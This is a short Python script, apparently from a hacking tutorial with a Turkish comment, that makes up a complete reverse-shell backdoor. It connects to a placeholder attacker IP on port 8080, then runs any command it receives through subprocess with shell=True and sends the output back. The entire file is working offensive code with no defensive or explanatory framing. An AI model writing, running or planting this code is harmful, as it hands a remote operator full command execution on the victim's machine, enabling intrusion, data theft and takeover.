import socket
import subprocess

def command_execution(command):
	
    return subprocess.check_output(command, shell=True) ## ---> Check_output sonucu döndürür. Call_output sadece çalıştırır.

my_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

my_connection.connect(("Change here! Enter IP address", 8080))

my_connection.send("Connection Okey\n")

while True:

    command = my_connection.recv(1024)

    command_output = command_execution(command)

    my_connection.send(command_output)

my_connection.close()
